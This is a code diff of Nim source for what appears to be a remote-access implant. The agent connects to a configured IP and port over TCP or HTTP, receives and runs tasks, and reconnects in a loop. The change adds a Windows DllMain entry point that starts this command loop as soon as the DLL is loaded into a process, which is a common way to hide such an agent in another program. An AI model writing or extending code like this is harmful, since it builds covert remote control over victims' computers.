@@ -1,5 +1,7 @@
 import std/[base64, json, os, jsonutils, strutils]
 
+import winim/lean
+
 when defined(tcp):
   import std/net
 elif defined(http):
@@ -109,19 +111,32 @@ proc receiveCommands(app: App) =
             handleTask app, task
     sleep sleepTime*1000
 
-
-when defined(tcp):
-  while true:
-    try:
-      app.socket.connect(ip, Port(port))
-      receiveCommands(app)
-    except OSError:
+proc beginConnection() =
+  when defined(tcp):
+    while true:
+      try:
+        app.socket.connect(ip, Port(port))
+        receiveCommands(app)
+      except OSError:
+        sleep(autoConnectTime)
+        continue
+      when defined(tcp):
+        app.socket = newSocket()
       sleep(autoConnectTime)
-      continue
-    when defined(tcp):
-      app.socket = newSocket()
-    sleep(autoConnectTime)
-elif defined(http):
-  when defined(debug):
-    echo "receiving commands"
-  receiveCommands(app)
+  elif defined(http):
+    when defined(debug):
+      echo "receiving commands"
+    receiveCommands(app)
+
+when defined(library) and defined(windows):
+  proc NimMain() {.cdecl, importc.}
+
+  proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+    NimMain()
+    
+    if fdwReason == DLL_PROCESS_ATTACH: 
+      beginConnection()
+
+    return true
+else:
+  beginConnection()
